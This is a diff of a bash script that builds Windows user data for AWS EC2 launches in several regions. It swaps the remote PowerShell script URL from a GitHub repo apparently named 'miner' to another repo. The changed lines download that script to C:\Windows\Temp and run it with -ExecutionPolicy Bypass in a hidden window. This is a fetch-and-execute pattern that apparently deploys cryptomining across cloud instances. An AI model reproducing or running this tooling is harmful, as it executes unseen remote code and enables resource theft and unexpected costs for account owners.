@@ -7,13 +7,13 @@ regions["us-east-2"]="ami-0b041308c8b9767f3"
 regions["us-west-2"]="ami-0a1f75c71aceb9a3f"
 
 # URL chứa User Data (PowerShell Script trên GitHub)
-user_data_url="https://raw.githubusercontent.com/hieudv194/miner/main/setup.ps1"
+user_data_url="https://raw.githubusercontent.com/hieudv194/Auto/refs/heads/main/Win.ps1"
 
 # Tạo nội dung User Data cho Windows
 user_data_file="/tmp/user_data.ps1"
 echo "<powershell>" > "$user_data_file"
-echo "Invoke-WebRequest -Uri \"$user_data_url\" -OutFile \"C:\\Windows\\Temp\\setup.ps1\"" >> "$user_data_file"
-echo "Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\setup.ps1\" -WindowStyle Hidden" >> "$user_data_file"
+echo "Invoke-WebRequest -Uri \"$user_data_url\" -OutFile \"C:\\Windows\\Temp\\Win.ps1\"" >> "$user_data_file"
+echo "Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\Win.ps1\" -WindowStyle Hidden" >> "$user_data_file"
 echo "</powershell>" >> "$user_data_file"
 
 # Mã hóa User Data chuẩn Windows
